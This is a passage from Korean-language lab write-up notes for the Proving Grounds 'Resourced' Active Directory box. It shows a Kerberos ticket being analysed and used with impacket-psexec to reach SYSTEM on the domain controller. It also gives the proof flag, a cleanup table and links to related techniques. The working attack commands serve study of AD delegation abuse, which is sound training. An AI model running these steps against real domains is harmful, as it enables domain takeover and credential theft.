[-] Could not find the correct encryption key! Ticket is encrypted with aes256_cts_hmac_sha1_96 (etype 18), but no keys/creds were supplied
```
— 출처: `impacket-describeTicket` 재실행(2026-08-26). 실제 출력에는 `Base64(key)` 와 약 2KB 짜리 `Kerberoast hash` 두 줄이 더 있으나 길이 때문에 여기서는 뺐음

**이 출력에서 확정되는 사실 넷**

1. 캐시에 자격증명이 **1개**뿐이고 그것이 TGT 가 아니라 서비스 티켓임. `krbtgt/RESOURCED.LOCAL` 항목이 없음 — 이 ccache 로는 `cifs/resourcedc.resourced.local` 외의 서비스에 붙을 수 없고, LDAP·WinRM 이 필요하면 `-spn` 을 바꿔 재발급해야 함
2. **`forwardable` 이 켜져 있음** — S4U2Proxy 전제조건이 실제로 충족됐다는 직접 증거
3. `ok_as_delegate` — 서비스(RESOURCEDC)가 위임 허용으로 표시돼 있음
4. 티켓 본체는 `aes256`(etype 18)로 암호화돼 있고 세션 키는 `rc4_hmac` 임. 본체는 서비스 계정 키로 암호화되므로 우리가 못 깜 — `Could not find the correct encryption key` 가 나오는 것이 **정상**임. 필요한 것은 본체가 아니라 캐시에 평문으로 있는 세션 키임

⚠️ **`describeTicket` 이 뱉는 `Kerberoast hash` 를 크랙 대상으로 착각하지 말 것.** 이 티켓은 머신계정 `RESOURCEDC$` 의 키로 암호화돼 있고 머신계정 비밀번호는 120자 랜덤이라 크랙이 사실상 불가능함. Kerberoasting 이 성립하는 것은 **사람이 만든 서비스 계정**(SPN 이 걸린 일반 사용자)의 티켓뿐임. 도구가 해시를 뱉는다고 크랙 대상인 것이 아님.

**④ 티켓으로 SYSTEM — `/etc/hosts` 와 `-k -no-pass`**

```bash
┌──(kali㉿kali)-[~]
└─$ sudo sed -i '/resourced.local/d' /etc/hosts

┌──(kali㉿kali)-[~]
└─$ echo "192.168.120.175  resourcedc.resourced.local resourced.local" | sudo tee -a /etc/hosts
192.168.120.175  resourcedc.resourced.local resourced.local

┌──(kali㉿kali)-[~]
└─$ impacket-psexec -k -no-pass resourcedc.resourced.local
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on resourcedc.resourced.local.....
[*] Found writable share ADMIN$
[*] Uploading file kEggVEPn.exe
[*] Opening SVCManager on resourcedc.resourced.local.....
[*] Creating service udmb on resourcedc.resourced.local.....
[*] Starting service udmb.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2145]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```
— 출처: 원본 노트 기록(대조 산출물 없음). 명령 원문은 `~/.zsh_history` 1481–1483행과 일치함

> [!danger] `-k -no-pass` 로 붙을 때는 IP 가 아니라 FQDN 을 타겟으로 줘야 한다
> `impacket-psexec --help` 원문(실측): *"`-k` Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) **based on target parameters.** If valid credentials cannot be found, it will use the ones specified in the command line"*
>
> **"based on target parameters"** 가 핵심임 — impacket 은 명령행에 준 타겟 문자열로 SPN 을 조립해 ccache 에서 찾음.
> - 타겟에 `192.168.120.175` 를 주면 `cifs/192.168.120.175` 를 찾음 → 캐시에 없음 → Kerberos 실패
> - 타겟에 `resourcedc.resourced.local` 을 주면 `cifs/resourcedc.resourced.local` → 위에서 발급받은 그 티켓
>
> 그래서 **① `/etc/hosts` 에 FQDN 을 등록하고 ② 타겟을 FQDN 으로 준다.** 둘이 함께여야 함. `-no-pass` 는 *"don't ask for password (useful for -k)"* — 없으면 비밀번호 프롬프트에서 멈춤.

`~/.zsh_history` 1476–1483행이 이 순간을 그대로 보존하고 있음.

```text
export KRB5CCNAME='Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache'
whoami
getent hosts resourcedc.resourced.local
grep resourced /etc/hosts
sudo sed -i '/resourced.local/d' /etc/hosts 
echo "192.168.120.175  resourcedc.resourced.local resourced.local" | sudo tee -a /etc/hosts
impacket-psexec -k -no-pass resourcedc.resourced.local
```

읽을 것 둘.

- **`sed -i '/resourced.local/d'` 를 «먼저» 돌린 것이 요령임.** 리버트로 IP 가 바뀌었으므로 옛 항목이 남아 있으면 먼저 매칭된 옛 IP 가 이김. 추가만 하고 삭제를 안 하면 원인 모를 실패가 계속됨. `getent hosts` 가 빈손으로 돌아온 것이 그 사전 확인이었음
- **`KRB5CCNAME` 을 파일명만으로 export 했음.** 그 시점 `cwd` 가 `~` 였고 파일도 `~` 에 있어 동작했으나, 직후 히스토리에 `mv Administrator@cifs_…ccache ./PG/Resourced` 가 있음 — **옮긴 뒤에는 같은 셸에서 `-k` 가 조용히 실패함.** 반사: 항상 절대 경로로 줄 것

```bash
export KRB5CCNAME=$(realpath 'Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache')
klist
```

### Post-Exploitation

**Proof.txt value:**
`5c7891bdc3a7fc5628221ef49b43b839`

```text
:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is 5C30-DCD7

 Directory of C:\Users\Administrator\Desktop

10/01/2021  04:28 AM    <DIR>          .
10/01/2021  04:28 AM    <DIR>          ..
07/05/2026  06:46 PM                34 proof.txt
               1 File(s)             34 bytes
               2 Dir(s)  11,007,508,480 bytes free

C:\Windows\system32> type C:\Users\Administrator\Desktop\proof.txt
5c7891bdc3a7fc5628221ef49b43b839
```
— 출처: 원본 노트 기록(대조 산출물 없음). psexec 세션 구간은 스크린샷이 남아 있지 않음

두 플래그 모두 **대화형 셸**에서 읽었음 — local.txt 는 evil-winrm PowerShell 세션, proof.txt 는 psexec 의 `nt authority\system` cmd 세션. psexec 세션은 SYSTEM 이므로 `whoami` 한 줄이 곧 권한 증명임. 다만 `whoami; hostname; ipconfig; type <플래그>` 를 **한 화면에 담은 증거 파일은 남기지 않았음**(관측 없음) — 시험 형식으로는 그 한 줄을 쳐서 파일로 떨어뜨려야 함.

**남긴 흔적**

| 흔적 | 위치 | 정리 방법 |
|---|---|---|
| 머신계정 `4Leaf$` (RID 4101) | AD `CN=Computers` | `impacket-addcomputer … -computer-name '4Leaf$' -delete` |
| `RESOURCEDC$` 의 `msDS-AllowedToActOnBehalfOfOtherIdentity` | DC 컴퓨터 객체 | `impacket-rbcd … -action remove`(또는 `flush`). 쓰기 전 값은 비어 있었음 |
| psexec 서비스 `udmb` + `ADMIN$\kEggVEPn.exe` | DC | psexec 정상 종료(`exit`) 시 자동 삭제. **강제 종료하면 남음** — `sc delete udmb` |
| Kali `/etc/hosts` 항목 | 로컬 | `sudo sed -i '/resourced.local/d' /etc/hosts` |
| ccache · `ntds.dit` 사본 · 도메인 전체 해시 | `~/PG/Resourced/` | 실전에서는 도메인 전체 자격증명이므로 암호화 보관 또는 파기 |

리버스셸·페이로드는 쓰지 않았음. **AD 박스의 표준 전개가 그러함** — 자격증명을 얻어 정식 프로토콜(WinRM·SMB·RPC)로 로그인하지 익스플로잇으로 코드 실행을 얻지 않음. 그래서 아웃바운드 방화벽·AV 탐지를 고민할 일이 애초에 없었음.

**증거 산출물** — `~/PG/Resourced/` 에 `nmap.log` · `users.txt` · `hashs.txt` · `sweep.txt` · `Active Directory/{ntds.dit,ntds.jfm}` · `registry/{ntds.dit,SYSTEM,SECURITY}` · `Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache` · BloodHound JSON 7종. 볼트 스크린샷은 07-03 8장 + 07-06 4장.

## 관련

- **RBCD** — [MS-SFU: S4U2Self / S4U2Proxy](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/) · Elad Shamir, *"Wagging the Dog: Abusing Resource-Based Constrained Delegation"*
- **`ntds.dit` 내부 구조 / PEK** — impacket `NTDSHashes` 클래스가 1차 사료. 디스크에 있음: `/usr/lib/python3/dist-packages/impacket/examples/secretsdump.py`
- **`ntdsutil` IFM** — [Microsoft: Install from Media](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/deploy/rodc/installing-ad-ds-from-media)
- **LDAP 비트 매칭 규칙** — `LDAP_MATCHING_RULE_BIT_AND` = `1.2.840.113556.1.4.803` · `BIT_OR` = `…804`
- **impacket** — <https://github.com/fortra/impacket> · **BloodHound.py** — <https://github.com/dirkjanm/BloodHound.py>
- [[Hutch]] — **짝을 이루는 박스.** 같은 Server 2019 단일 DC, 같은 「텍스트 필드에 적힌 비밀번호」, 같은 「DC 컴퓨터 객체에 붙은 ACE」(거기서는 `ReadLAPSPassword`). 연달아 읽을 것
- [[Vault]] — AD 종합. `SeBackupPrivilege` 로 하이브를 «직접» 뜨는 경로 · DCSync · GPO 남용
- [[Heist]] — NTLM 릴레이. 이 박스는 SMB 서명 강제로 그 경로가 막혔다는 대조군
- [[Nagoya]] — Kerberoast · AS-REP roast 중심의 AD. 이 박스에서 쓰지 않은 로스팅 경로
- [[Butch]] — 웹셸로 읽은 플래그는 0점이라는 규정 원문의 출처
- [[_PLAYBOOK#A-51. AD 박스에서 막히면 «취약점»이 아니라 넷을 먼저 본다]] · [[_PLAYBOOK#A-65. 리버트되면 IP 가 바뀐다 — 노트의 IP 에는 «어느 세션»인지를 붙인다]]
- [[_PLAYBOOK#B-51. «사용자 설명 필드»는 AD 의 자격증명 저장소다]] · [[_PLAYBOOK#B-52. 실패 표시가 실패를 뜻하지 않는다 — NTLM 상태 코드를 읽는다]] · [[_PLAYBOOK#B-53. 유효한 도메인 자격증명 «하나»를 얻으면 즉시 BloodHound를 돌린다]] · [[_PLAYBOOK#B-54. DC 컴퓨터 객체에 붙은 저권한 ACE는 곧 도메인 장악이다]]
